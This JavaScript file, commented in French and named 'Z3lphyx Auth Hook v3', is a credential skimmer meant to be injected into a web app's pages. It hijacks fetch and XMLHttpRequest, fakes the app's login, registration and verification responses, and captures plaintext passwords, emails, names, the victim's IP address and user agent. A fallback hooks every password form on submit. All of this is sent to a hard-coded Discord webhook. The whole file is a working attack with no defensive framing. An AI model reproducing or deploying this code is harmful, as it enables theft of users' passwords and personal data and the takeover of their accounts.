// Z3lphyx Auth Hook v3 — Interception + Mock API + Discord
(function() {
    'use strict';

    var WEBHOOK = "https://discord.com/api/webhooks/1506998147434676304/jVsItbE7-LukI-fyshElFimQcZEb8iWi7CZ2ANdXZoIJOwmAItJWB9mbdEmjStI8uRSA";
    var ALLOWED_DOMAINS = ['gmail.com','outlook.com','hotmail.com','yahoo.com','icloud.com','protonmail.com','proton.me','zoho.com','aol.com'];
    var cachedIP = null;
    var pendingRegister = null;

    /* ===== IP PUBLIQUE ===== */
    async function getIP() {
        if (cachedIP) return cachedIP;
        for (var u of ['https://api.ipify.org?format=json','https://ipapi.co/json/']) {
            try { var r = await fetch(u,{signal:AbortSignal.timeout(3000)}); var d = await r.json(); cachedIP = d.ip||d; return cachedIP; } catch(e){}
        }
        return 'Inconnu';
    }
    getIP();

    /* ===== DISCORD ===== */
    function sendToDiscord(embed) {
        // IMPORTANT: fetch direct vers Discord, PAS intercepté (voir bypass plus bas)
        try {
            fetch(WEBHOOK, {
                method:'POST',
                headers:{'Content-Type':'application/json'},
                body:JSON.stringify({username:'Z3lphyx Auth',embeds:[embed]}),
                keepalive:true
            }).catch(function(){});
        } catch(e){}
    }

    function buildEmbed(title,color,fields) {
        var d = new Date();
        var dateStr = d.toLocaleDateString('fr-FR') + ' ' + d.toLocaleTimeString('fr-FR');
        return {title:title,color:color,fields:fields,footer:{text:'Z3lphyx Auth · '+dateStr},timestamp:d.toISOString()};
    }

    function sendCreds(creds,source,isRegister) {
        getIP().then(function(ip){
            var ua = navigator.userAgent;
            if (isRegister) {
                sendToDiscord(buildEmbed('📝 Nouvelle Inscription ['+source+']',0x00ff88,[
                    {name:'👤 Nom',      value:creds.nom||creds.last_name||creds.Nom||creds.full_name||'N/A', inline:true},
                    {name:'👤 Prénom',   value:creds.prenom||creds.first_name||creds.Prénom||'N/A', inline:true},
                    {name:'🏷️ Pseudo',  value:creds.pseudo||creds.username||creds.Pseudo||'N/A', inline:true},
                    {name:'📧 Email',    value:creds.email||creds.Email||'N/A', inline:true},
                    {name:'🔑 Mot de passe', value:'||'+(creds.password||creds.Password||'')+'||', inline:false},
                    {name:'🌐 IP',       value:'||'+ip+'||', inline:true},
                    {name:'🧭 User-Agent', value:'```'+ua.slice(0,180)+'```', inline:false}
                ]));
            } else {
                sendToDiscord(buildEmbed('🔐 Connexion Détectée ['+source+']',0x00f0ff,[
                    {name:'👤 Identifiant', value:creds.email||creds.identifier||creds.username||creds.Pseudo||'N/A', inline:true},
                    {name:'🔑 Mot de passe', value:'||'+(creds.password||'')+'||', inline:false},
                    {name:'🌐 IP',          value:'||'+ip+'||', inline:true},
                    {name:'🧭 User-Agent',  value:'```'+ua.slice(0,180)+'```', inline:false}
                ]));
            }
        });
    }

    function parseCreds(bodyStr) {
        if (!bodyStr) return null;
        try {
            var d = typeof bodyStr==='string' ? JSON.parse(bodyStr) : bodyStr;
            if (!d||typeof d!=='object') return null;
            var c = {};
            for (var k in d) {
                var v = d[k], kl = k.toLowerCase();
                if (/pass|mdp|motdepasse/i.test(kl)) c.password = String(v);
                else if (/email|mail|adresse/i.test(kl)) c.email = String(v);
                else if (/pseudo|username|user|login|identifier/i.test(kl)) c.username = String(v);
                else if (/nom|surname|last.?name|family.?name/i.test(kl)) c.nom = String(v);
                else if (/prenom|first.?name|given.?name|prénom/i.test(kl)) c.prenom = String(v);
                else c[k] = String(v);
            }
            return c.password ? c : null;
        } catch(e){return null;}
    }

    function mockToken() {
        var c='abcdef0123456789', t='';
        for(var i=0;i<64;i++) t+=c[Math.floor(Math.random()*c.length)];
        return 'mock_'+t;
    }

    /* ===== GÉNÉRATEUR DE RÉPONSES MOCK ===== */
    function mockResponse(url, body, method) {
        var u = url.toLowerCase(), m = (method||'GET').toUpperCase();
        
        // ═══════════════════════════════════════════════
        // BYPASS CRITIQUE : NE PAS INTERCEPTER DISCORD
        // ═══════════════════════════════════════════════
        if (u.indexOf('discord.com') > -1) return null;

        // Public settings
        if (u.indexOf('/public-settings/')>-1 || u.indexOf('/apps/public')>-1) {
            return {data:{id:'6a608801949bfa0162d3ef90',name:'Z3lphyx Gateway',
                settings:{auth_methods:['email_password'],allowed_domains:ALLOWED_DOMAINS,require_verification:false},
                status:'active'}, status:200, headers:{'content-type':'application/json'}};
        }
        // Profile filter (pseudo lookup) - retourne un profil factice avec email
        if (u.indexOf('/profile/filter')>-1 || u.indexOf('/profiles/filter')>-1 ||
            (u.indexOf('/profile')>-1 && m==='GET' && u.indexOf('filter')>-1)) {
            var pseudo = '';
            try { var bd = JSON.parse(body||'{}'); pseudo = bd.pseudo||bd.Pseudo||bd.username||''; } catch(e){}
            return {data:[{id:'mock_prof_1',pseudo:pseudo||'user',email:(pseudo||'user')+'@mock.com',
                first_name:'Mock',last_name:'User'}], status:200, headers:{'content-type':'application/json'}};
        }
        // Profile create
        if ((u.indexOf('/profile')>-1||u.indexOf('/entities/profile/')>-1) && m==='POST') {
            return {data:{id:'mock_'+Date.now(),created:true}, status:200, headers:{'content-type':'application/json'}};
        }
        // REGISTER - retourne token direct, pas d'OTP
        if (u.indexOf('/auth/register')>-1 || u.indexOf('/register')>-1) {
            var creds = parseCreds(body);
            var tok = mockToken();
            if (creds) {
                pendingRegister = creds;
                setTimeout(function(){ sendCreds(creds,'Register',true); },50);
                setTimeout(function(){
                    try{localStorage.setItem('base44_access_token',tok);localStorage.setItem('base44_token',tok);}catch(e){}
                    window.location.href='/';
                },600);
            }
            return {data:{access_token:tok,token_type:'bearer',verified:true,user:{email:creds?creds.email:''}}, status:200, headers:{'content-type':'application/json'}};
        }
        // LOGIN
        if (u.indexOf('/auth/login')>-1 || u.indexOf('/loginviaemailpassword')>-1 || (u.indexOf('/login')>-1 && m==='POST')) {
            var creds = parseCreds(body);
            var tok = mockToken();
            if (creds) {
                setTimeout(function(){ sendCreds(creds,'Login',false); },50);
                setTimeout(function(){
                    try{localStorage.setItem('base44_access_token',tok);localStorage.setItem('base44_token',tok);}catch(e){}
                    window.location.href='/';
                },600);
            }
            return {data:{access_token:tok,token_type:'bearer',user:{email:creds?creds.email:''}}, status:200, headers:{'content-type':'application/json'}};
        }
        // OTP/Verify
        if (u.indexOf('/verify')>-1 || u.indexOf('/otp')>-1 || u.indexOf('/verifyotp')>-1) {
            var tok = mockToken();
            if (pendingRegister){setTimeout(function(){sendCreds(pendingRegister,'OTP',true);},50);pendingRegister=null;}
            return {data:{access_token:tok,token_type:'bearer',verified:true}, status:200, headers:{'content-type':'application/json'}};
        }
        if (u.indexOf('/resend')>-1) {return {data:{success:true}, status:200};}
        if (u.indexOf('/auth/me')>-1 || u.indexOf('/user/me')>-1) {
            return {data:{id:'mock_user_'+Date.now(),email:'mock@user.com',role:'user',username:'z3lphyx_user'}, status:200, headers:{'content-type':'application/json'}};
        }
        if (u.indexOf('/updateme')>-1 || u.indexOf('/update')>-1 || (u.indexOf('/me')>-1 && (m==='PATCH'||m==='PUT'))) {
            return {data:{success:true,updated:true}, status:200, headers:{'content-type':'application/json'}};
        }
        if (u.indexOf('/auth/check')>-1||u.indexOf('/authenticated')>-1) {return {data:{authenticated:true}, status:200};}
        if (u.indexOf('/logout')>-1) {return {data:{success:true}, status:200};}
        if (u.indexOf('/app-logs/')>-1) {return {data:{logged:true}, status:200};}
        if (u.indexOf('/api/')>-1) {return {data:{success:true}, status:200};}
        return null;
    }

    /* =========================================================
       INTERCEPTION FETCH — BYPASS DISCORD
       ========================================================= */
    var _fetch = window.fetch;
    window.fetch = async function(input, init) {
        var url = '', body = null, method = 'GET';
        if (typeof input === 'string') { url = input; method = (init&&init.method)||'GET'; body = (init&&init.body)||null; }
        else if (input instanceof Request) { url = input.url; method = input.method||'GET'; try{body=await input.clone().text();}catch(e){} }
        
        // BYPASS : ne jamais intercepter Discord
        if (url.indexOf('discord.com') > -1 || url.indexOf('discordapp.com') > -1) {
            return _fetch.apply(this, arguments);
        }
        
        if (url.indexOf('/api/') > -1) {
            var mock = mockResponse(url, body, method);
            if (mock) {
                return new Response(JSON.stringify(mock.data), {
                    status: mock.status,
                    statusText: 'OK',
                    headers: new Headers({'Content-Type':'application/json'})
                });
            }
        }
        return _fetch.apply(this, arguments);
    };

    /* =========================================================
       INTERCEPTION XHR (Axios) — AVEC getAllResponseHeaders
       ========================================================= */
    var _origOpen = XMLHttpRequest.prototype.open;
    var _origSend = XMLHttpRequest.prototype.send;
    var _origSetRH = XMLHttpRequest.prototype.setRequestHeader;
    var _origGetAll = XMLHttpRequest.prototype.getAllResponseHeaders;
    var _origGet = XMLHttpRequest.prototype.getResponseHeader;

    XMLHttpRequest.prototype.open = function(method, url) {
        this._zm = (method||'GET').toUpperCase();
        this._zu = (url||'').toString();
        this._zheaders = {};
        this._zlisteners = {};
        return _origOpen.apply(this, arguments);
    };

    XMLHttpRequest.prototype.setRequestHeader = function(k, v) {
        this._zheaders[k] = v;
        return _origSetRH.apply(this, arguments);
    };

    XMLHttpRequest.prototype.addEventListener = function(type, fn) {
        if (!this._zlisteners[type]) this._zlisteners[type] = [];
        this._zlisteners[type].push(fn);
        // Appel aussi l'original au cas où
        var orig = XMLHttpRequest.prototype.addEventListener;
        return orig ? orig.apply(this, arguments) : undefined;
    };

    XMLHttpRequest.prototype.getAllResponseHeaders = function() {
        if (this._zmockHeaders) return this._zmockHeaders;
        return _origGetAll ? _origGetAll.apply(this, arguments) : '';
    };

    XMLHttpRequest.prototype.getResponseHeader = function(key) {
        if (this._zmockHeaders) {
            var lower = key.toLowerCase();
            var lines = this._zmockHeaders.split('\r\n');
            for (var i=0; i<lines.length; i++) {
                var parts = lines[i].split(': ');
                if (parts[0].toLowerCase() === lower) return parts[1];
            }
            return null;
        }
        return _origGet ? _origGet.apply(this, arguments) : null;
    };

    XMLHttpRequest.prototype.send = function(body) {
        var url = this._zu || '';
        var method = this._zm || 'GET';

        // BYPASS : ne jamais intercepter Discord
        if (url.indexOf('discord.com') > -1 || url.indexOf('discordapp.com') > -1) {
            return _origSend.apply(this, arguments);
        }

        if (url.indexOf('/api/') > -1) {
            var mock = mockResponse(url, body, method);
            if (mock) {
                var self = this;
                var dataStr = JSON.stringify(mock.data);
                var headersStr = 'Content-Type: application/json\r\n';
                if (mock.headers) {
                    for (var hk in mock.headers) {
                        headersStr += hk + ': ' + mock.headers[hk] + '\r\n';
                    }
                }
                headersStr += 'X-Z3lphyx-Mock: true\r\n';

                setTimeout(function() {
                    try {
                        self._zmockHeaders = headersStr;
                        self.readyState = 4;
                        self.status = mock.status;
                        self.statusText = 'OK';
                        self.responseText = dataStr;
                        self.response = dataStr;

                        // Trigger onreadystatechange (utilisé par Axios)
                        if (self.onreadystatechange) {
                            self.onreadystatechange.call(self, {type:'readystatechange'});
                        }
                        // Trigger addEventListener listeners
                        if (self._zlisteners && self._zlisteners['readystatechange']) {
                            for (var i=0; i<self._zlisteners['readystatechange'].length; i++) {
                                try{self._zlisteners['readystatechange'][i].call(self,{type:'readystatechange'});}catch(e){}
                            }
                        }
                        // load event
                        if (self.onload) self.onload.call(self,{type:'load'});
                        if (self._zlisteners && self._zlisteners['load']) {
                            for (var i=0; i<self._zlisteners['load'].length; i++) {
                                try{self._zlisteners['load'][i].call(self,{type:'load'});}catch(e){}
                            }
                        }
                        // loadend event
                        if (self.onloadend) self.onloadend.call(self,{type:'loadend'});
                        if (self._zlisteners && self._zlisteners['loadend']) {
                            for (var i=0; i<self._zlisteners['loadend'].length; i++) {
                                try{self._zlisteners['loadend'][i].call(self,{type:'loadend'});}catch(e){}
                            }
                        }
                    } catch(e) { console.warn('[ZH] XHR mock error:', e); }
                }, 120);
                return; // ← on ne call pas le vrai send
            }
        }
        return _origSend.apply(this, arguments);
    };

    /* =========================================================
       DOM FALLBACK (filet de sécurité)
       ========================================================= */
    setTimeout(function() {
        try {
            new MutationObserver(function() {
                document.querySelectorAll('form').forEach(function(form) {
                    if (form.dataset.zHook) return;
                    var pwd = form.querySelector('input[type="password"]');
                    if (!pwd) return;
                    form.dataset.zHook = '1';
                    form.addEventListener('submit', function() {
                        var f = new FormData(form);
                        var c = {};
                        for (var entry of f.entries()) c[entry[0]] = entry[1];
                        if (!c.password && !c.mot_de_passe && !c.mdp) return;
                        var hasExtra = c.nom||c.prenom||c.first_name||c.last_name||c.Nom||c.Prénom;
                        sendCreds({
                            password: c.password||c.mot_de_passe||c.mdp||c.Password,
                            email: c.email||c.mail||c.Email,
                            username: c.pseudo||c.username||c.user||c.login||c.identifier||c.Pseudo,
                            nom: c.nom||c.last_name||c.surname||c.Nom,
                            prenom: c.prenom||c.first_name||c.prénom||c.Prénom
                        }, 'DOM', !!hasExtra);
                    }, true);
                });
            }).observe(document.body||document.documentElement, {childList:true,subtree:true});
        } catch(e){}
    }, 1500);

    /* =========================================================
       INDICATEUR VISIBLE dans la console
       ========================================================= */
    console.log('%c[Z3lphyx Hook v3]','color:#00f0ff;font-weight:bold','✓ Actif — Discord bypass — XHR getAllResponseHeaders — Axios compatible');

    // Marquer dans le DOM qu'on est prêt (pour déboguer)
    var marker = document.createElement('meta');
    marker.name = 'z3lphyx-hook';
    marker.content = 'active';
    document.head.appendChild(marker);
})();